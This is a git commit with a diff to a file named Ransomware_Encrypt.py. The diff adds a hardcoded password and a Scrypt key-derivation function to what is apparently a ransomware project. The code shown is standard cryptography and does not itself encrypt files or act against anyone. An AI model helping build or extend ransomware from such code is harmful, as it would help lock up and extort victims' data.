6a121c18e7a1aebff1b64a2c71ba1c7db305473d
Wambita <wambitafana@gmail.com>
2026-03-02 13:59:17 +0300

    Feat: derive a key from the  password using kdf and  added a predefined passoword

--- Ransomware_Encrypt.py
+++ Ransomware_Encrypt.py
@@ -7,3 +7,18 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import platform
 
+# predefined passoword
+PASSWORD = "my_secure_password"
+
+def derive_key(password: str, salt: bytes)-> bytes:
+    """Derive a key from the password using Scrypt KDF."""
+    kdf = Scrypt(
+        salt=salt,
+        length=32,
+        n=2**14,
+        r=8,
+        p=1,
+        backend=default_backend()
+    )
+    key = kdf.derive(password.encode())
+    return key
